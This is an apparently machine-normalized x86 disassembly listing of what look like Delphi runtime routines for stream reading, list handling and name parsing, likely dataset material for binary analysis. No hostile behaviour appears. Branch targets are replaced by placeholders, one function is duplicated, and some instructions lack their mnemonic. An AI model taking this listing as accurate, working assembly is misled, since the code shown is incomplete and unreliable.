mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ffc
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ffc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41682c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ffc
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ffc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_416884
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404098
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404508
mov al 0x1
inc ebx
sub_4168dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416953
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4056c4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4112ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41695a
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410bfc
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4056c4
mov ecx eax
mov eax esi
pop edx
call sub_40d284
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4056c4
sub_416960
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416a06
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a0d
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404098
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419f34
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407d1c
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416a28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413fa0
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413fa0
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413de8
sub_416a60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413fa0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413fa0
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413e34
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413de8
sub_416aa8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416c41
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4142b0
mov edi eax
xor edx edx
push ebp
push sub_416c22
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c29
mov eax [ rw-data ]
call sub_414314
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416c03
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416bb1
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413f44
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413a90
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bb8
mov eax [ ebp - 0x8 ]
call sub_403258
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410d28
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416a28
pop ecx
mov edx esi
mov eax edi
call sub_413e34
mov eax ebx
call sub_403258
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416960
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416a60
pop ecx
inc esi
sub_416bb8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_416c50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4142b0
mov edi eax
xor eax eax
push ebp
push sub_416ceb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
mov edx ebx
mov eax edi
call sub_413f44
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413e34
mov eax esi
call sub_403258
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407d1c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416cfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4142b0
mov edi eax
xor eax eax
push ebp
push sub_416d73
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
mov edx ebx
mov eax edi
call sub_413f44
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413e34
mov eax esi
call sub_403258
sub_416da4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
pop ecx
pop edx
pop ebx
retn
sub_416de8
push ebx
push esi
push edi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416728
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_416e24
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418cfc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418e0c
call sub_416d98
sub_416e48
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407d1c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403fa8
sub_416e7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407d1c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cfc
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416f3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_4172c0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4172c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f44
mov eax [ ebp - 0x8 ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418e0c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416d98
sub_416f6c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416f8c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404244
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034dc
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_416d98
sub_416ff4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4142b0
mov esi eax
xor edx edx
push ebp
push sub_417064
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41706b
mov eax [ rw-data ]
call sub_414314
retn
mov edx ebx
mov eax esi
call sub_413f44
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403258
mov edx ebx
mov eax esi
call sub_413e34
sub_417070
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41717f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417186
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
xor edx edx
push ebp
push sub_417162
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4171b4
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416884
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413f44
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404040
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416960
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413f44
call sub_416ff4
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413f44
mov edx eax
mov eax [ rw-data ]
call sub_414228
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_414038
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_417190
push ebx
mov ebx eax
mov eax ebx
call sub_417284
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415bbc
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_4171b4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403258
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413f44
call sub_403258
inc edi
dec esi
jne r-xdata
sub_4171f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031a0
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4135d8
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031e4
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413650
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413550
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031bc
test al al
jne r-xdata
sub_4172c0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41730c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41730c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
sub_41735c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4173a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b5c
mov eax [ ebp - 0x4 ]
call sub_404268
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173ae
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
call sub_416d98
sub_4173b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417454
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416f58
test al al
jne r-xdata
mov eax ebx
call sub_416f58
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41477c
jmp r-xdata
mov eax ebx
call sub_41729c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41745b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41475c
mov esi eax
mov eax ebx
call sub_417ebc
jmp r-xdata
mov eax ebx
call sub_417e0c
mov eax ebx
call sub_416f58
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418028
mov eax ebx
call sub_417ec4
sub_417484
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413de8
inc esi
dec ebx
jne r-xdata
sub_4174c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a050
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e1c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd8
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a024
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e1c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a024
test [ eax + 0x24 ] 0x4
je r-xdata
sub_417538
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e1c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4175a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_4175c0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_4175a0
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418ff0
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403258
sub_417620
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417706
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419190
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_4176da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41770b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175c0
pop ecx
test al al
jne r-xdata
call sub_403a60
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a0c
sub_417730
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4177a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403454
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413a90
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4177ad
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175c0
pop ecx
test al al
jne r-xdata
call sub_403a60
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a0c
sub_4177d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41784b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419190
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403454
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417850
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175c0
pop ecx
test al al
jne r-xdata
call sub_403a60
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a0c
sub_417874
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417a95
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418b20
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418b20
